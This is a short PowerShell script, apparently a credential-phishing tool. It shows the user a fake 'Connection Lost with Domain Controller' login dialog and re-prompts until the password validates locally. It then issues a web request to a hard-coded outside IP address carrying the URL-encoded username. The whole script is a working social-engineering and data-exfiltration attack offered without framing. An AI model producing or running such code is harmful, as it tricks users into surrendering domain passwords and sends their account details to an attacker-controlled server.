function antani
{ 
[System.Reflection.Assembly]::LoadWithPartialName("System.web")
$cred = $Host.ui.PromptForCredential("Connection Lost with Domain Controller", "Please login again", "$env:userdomain\$env:username","")
$username = "$env:username"
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
while($DS.ValidateCredentials("$full", "$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials("$full", "$password") | out-null
    }
 
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $username = $output.UserName
 $password = $output.password
 $domain = $output.Domain
 Send-Credentials($username, $password, $domain)
}

function Send-Credentials($username, $password, $domain)
{
 $wc = New-Object system.Net.WebClient;
 $username = [System.Web.HttpUtility]::UrlEncode($username);
 $res = $wc.downloadString("http://145.239.41.237/antani/$username")
}

antani
